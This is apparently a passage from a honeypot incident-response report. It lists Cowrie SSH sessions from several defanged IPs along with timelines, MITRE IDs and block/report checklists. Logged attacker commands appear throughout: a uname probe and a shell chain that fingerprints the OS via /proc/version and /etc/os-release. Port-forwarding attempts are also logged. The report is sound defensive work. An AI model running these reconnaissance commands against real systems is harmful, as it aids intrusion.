- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5ce7fffd77

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:16 |
| **Last Seen** | 2026-07-24 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:16:22` | `cowrie.session.connect` |
| `2026-07-24 07:16:22` | `cowrie.client.version` |
| `2026-07-24 07:16:22` | `cowrie.client.kex` |
| `2026-07-24 07:16:22` | `cowrie.login.success` |
| `2026-07-24 07:16:23` | `cowrie.session.params` |
| `2026-07-24 07:16:23` | `cowrie.command.input` |
| `2026-07-24 07:16:23` | `cowrie.log.closed` |
| `2026-07-24 07:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e728227367

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:16 |
| **Last Seen** | 2026-07-24 07:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:16:58` | `cowrie.session.connect` |
| `2026-07-24 07:16:58` | `cowrie.client.version` |
| `2026-07-24 07:16:58` | `cowrie.client.kex` |
| `2026-07-24 07:17:00` | `cowrie.login.success` |
| `2026-07-24 07:17:01` | `cowrie.session.params` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.success` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:01` | `cowrie.command.input` |
| `2026-07-24 07:17:02` | `cowrie.log.closed` |
| `2026-07-24 07:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf05eed65a02

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:18 |
| **Last Seen** | 2026-07-24 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:18:13` | `cowrie.session.connect` |
| `2026-07-24 07:18:13` | `cowrie.client.version` |
| `2026-07-24 07:18:13` | `cowrie.client.kex` |
| `2026-07-24 07:18:13` | `cowrie.login.success` |
| `2026-07-24 07:18:14` | `cowrie.session.params` |
| `2026-07-24 07:18:14` | `cowrie.command.input` |
| `2026-07-24 07:18:14` | `cowrie.log.closed` |
| `2026-07-24 07:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-449eab0784a4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:19 |
| **Last Seen** | 2026-07-24 07:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:19:05` | `cowrie.session.connect` |
| `2026-07-24 07:19:06` | `cowrie.client.version` |
| `2026-07-24 07:19:06` | `cowrie.client.kex` |
| `2026-07-24 07:19:08` | `cowrie.login.success` |
| `2026-07-24 07:19:10` | `cowrie.session.params` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.success` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.command.input` |
| `2026-07-24 07:19:10` | `cowrie.log.closed` |
| `2026-07-24 07:19:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a159a34c4f3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:20 |
| **Last Seen** | 2026-07-24 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:20:04` | `cowrie.session.connect` |
| `2026-07-24 07:20:04` | `cowrie.client.version` |
| `2026-07-24 07:20:04` | `cowrie.client.kex` |
| `2026-07-24 07:20:04` | `cowrie.login.success` |
| `2026-07-24 07:20:05` | `cowrie.session.params` |
| `2026-07-24 07:20:05` | `cowrie.command.input` |
| `2026-07-24 07:20:05` | `cowrie.log.closed` |
| `2026-07-24 07:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a4225d804cd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:21 |
| **Last Seen** | 2026-07-24 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:21:11` | `cowrie.session.connect` |
| `2026-07-24 07:21:12` | `cowrie.client.version` |
| `2026-07-24 07:21:12` | `cowrie.client.kex` |
| `2026-07-24 07:21:14` | `cowrie.login.success` |
| `2026-07-24 07:21:16` | `cowrie.session.params` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.success` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.command.input` |
| `2026-07-24 07:21:16` | `cowrie.log.closed` |
| `2026-07-24 07:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a8b53603a5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:21 |
| **Last Seen** | 2026-07-24 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:21:51` | `cowrie.session.connect` |
| `2026-07-24 07:21:51` | `cowrie.client.version` |
| `2026-07-24 07:21:51` | `cowrie.client.kex` |
| `2026-07-24 07:21:52` | `cowrie.login.success` |
| `2026-07-24 07:21:53` | `cowrie.session.params` |
| `2026-07-24 07:21:53` | `cowrie.command.input` |
| `2026-07-24 07:21:53` | `cowrie.log.closed` |
| `2026-07-24 07:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d13437725841

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:23 |
| **Last Seen** | 2026-07-24 07:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:23:20` | `cowrie.session.connect` |
| `2026-07-24 07:23:20` | `cowrie.client.version` |
| `2026-07-24 07:23:20` | `cowrie.client.kex` |
| `2026-07-24 07:23:22` | `cowrie.login.success` |
| `2026-07-24 07:23:24` | `cowrie.session.params` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.success` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.command.input` |
| `2026-07-24 07:23:24` | `cowrie.log.closed` |
| `2026-07-24 07:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b18d310a3a54

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-24 07:23 |
| **Last Seen** | 2026-07-24 07:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:23:32` | `cowrie.session.connect` |
| `2026-07-24 07:23:33` | `cowrie.client.version` |
| `2026-07-24 07:23:33` | `cowrie.client.kex` |
| `2026-07-24 07:23:35` | `cowrie.login.success` |
| `2026-07-24 07:23:35` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d48eed62922

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:23 |
| **Last Seen** | 2026-07-24 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:23:40` | `cowrie.session.connect` |
| `2026-07-24 07:23:40` | `cowrie.client.version` |
| `2026-07-24 07:23:40` | `cowrie.client.kex` |
| `2026-07-24 07:23:41` | `cowrie.login.success` |
| `2026-07-24 07:23:41` | `cowrie.session.params` |
| `2026-07-24 07:23:41` | `cowrie.command.input` |
| `2026-07-24 07:23:41` | `cowrie.log.closed` |
| `2026-07-24 07:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ede785fc3b3

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-07-24 07:23 |
| **Last Seen** | 2026-07-24 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:23:40` | `cowrie.session.connect` |
| `2026-07-24 07:23:41` | `cowrie.client.version` |
| `2026-07-24 07:23:41` | `cowrie.client.kex` |
| `2026-07-24 07:23:43` | `cowrie.login.success` |
| `2026-07-24 07:23:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33392f178cd2

| Field | Detail |
|---|---|
| **Source IP** | `110.227.213[.]163` |
| **First Seen** | 2026-07-24 07:24 |
| **Last Seen** | 2026-07-24 07:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:24:09` | `cowrie.session.connect` |
| `2026-07-24 07:24:10` | `cowrie.client.version` |
| `2026-07-24 07:24:10` | `cowrie.client.kex` |
| `2026-07-24 07:24:12` | `cowrie.login.success` |
| `2026-07-24 07:24:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.213[.]163` to AbuseIPDB if not already reported
- [ ] Block `110.227.213[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dd9c640b1d4

| Field | Detail |
|---|---|
| **Source IP** | `34.29.104[.]32` |
| **First Seen** | 2026-07-24 07:24 |
| **Last Seen** | 2026-07-24 07:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:24:18` | `cowrie.session.connect` |
| `2026-07-24 07:24:18` | `cowrie.client.version` |
| `2026-07-24 07:24:18` | `cowrie.client.kex` |
| `2026-07-24 07:24:19` | `cowrie.login.success` |
| `2026-07-24 07:24:19` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.29.104[.]32` to AbuseIPDB if not already reported
- [ ] Block `34.29.104[.]32` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c4258e0688

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:25 |
| **Last Seen** | 2026-07-24 07:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:25:32` | `cowrie.session.connect` |
| `2026-07-24 07:25:33` | `cowrie.client.version` |
| `2026-07-24 07:25:33` | `cowrie.client.kex` |
| `2026-07-24 07:25:36` | `cowrie.login.success` |
| `2026-07-24 07:25:37` | `cowrie.session.params` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.success` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:37` | `cowrie.command.input` |
| `2026-07-24 07:25:38` | `cowrie.log.closed` |
| `2026-07-24 07:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee2eaf17a3eb

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:25 |
| **Last Seen** | 2026-07-24 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:25:33` | `cowrie.session.connect` |
| `2026-07-24 07:25:33` | `cowrie.client.version` |
| `2026-07-24 07:25:33` | `cowrie.client.kex` |
| `2026-07-24 07:25:34` | `cowrie.login.success` |
| `2026-07-24 07:25:35` | `cowrie.session.params` |
| `2026-07-24 07:25:35` | `cowrie.command.input` |
| `2026-07-24 07:25:35` | `cowrie.log.closed` |
| `2026-07-24 07:25:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01219afc23e7

| Field | Detail |
|---|---|
| **Source IP** | `122.224.164[.]194` |
| **First Seen** | 2026-07-24 07:26 |
| **Last Seen** | 2026-07-24 07:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:26:01` | `cowrie.session.connect` |
| `2026-07-24 07:26:02` | `cowrie.client.version` |
| `2026-07-24 07:26:02` | `cowrie.client.kex` |
| `2026-07-24 07:26:05` | `cowrie.login.success` |
| `2026-07-24 07:26:05` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.224.164[.]194` to AbuseIPDB if not already reported
- [ ] Block `122.224.164[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4affc0d5913

| Field | Detail |
|---|---|
| **Source IP** | `85.192.184[.]145` |
| **First Seen** | 2026-07-24 07:26 |
| **Last Seen** | 2026-07-24 07:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:26:15` | `cowrie.session.connect` |
| `2026-07-24 07:26:15` | `cowrie.client.version` |
| `2026-07-24 07:26:15` | `cowrie.client.kex` |
| `2026-07-24 07:26:16` | `cowrie.login.success` |
| `2026-07-24 07:26:17` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.192.184[.]145` to AbuseIPDB if not already reported
- [ ] Block `85.192.184[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3659324705a8

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-07-24 07:27 |
| **Last Seen** | 2026-07-24 07:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:27:00` | `cowrie.session.connect` |
| `2026-07-24 07:27:00` | `cowrie.client.version` |
| `2026-07-24 07:27:00` | `cowrie.client.kex` |
| `2026-07-24 07:27:02` | `cowrie.login.success` |
| `2026-07-24 07:27:03` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd858abcc06

| Field | Detail |
|---|---|
| **Source IP** | `95.79.108[.]51` |
| **First Seen** | 2026-07-24 07:27 |
| **Last Seen** | 2026-07-24 07:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:27:12` | `cowrie.session.connect` |
| `2026-07-24 07:27:12` | `cowrie.client.version` |
| `2026-07-24 07:27:12` | `cowrie.client.kex` |
| `2026-07-24 07:27:13` | `cowrie.login.success` |
| `2026-07-24 07:27:13` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.108[.]51` to AbuseIPDB if not already reported
- [ ] Block `95.79.108[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8afa657d0947

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:27 |
| **Last Seen** | 2026-07-24 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:27:25` | `cowrie.session.connect` |
| `2026-07-24 07:27:25` | `cowrie.client.version` |
| `2026-07-24 07:27:25` | `cowrie.client.kex` |
| `2026-07-24 07:27:26` | `cowrie.login.success` |
| `2026-07-24 07:27:27` | `cowrie.session.params` |
| `2026-07-24 07:27:27` | `cowrie.command.input` |
| `2026-07-24 07:27:27` | `cowrie.log.closed` |
| `2026-07-24 07:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
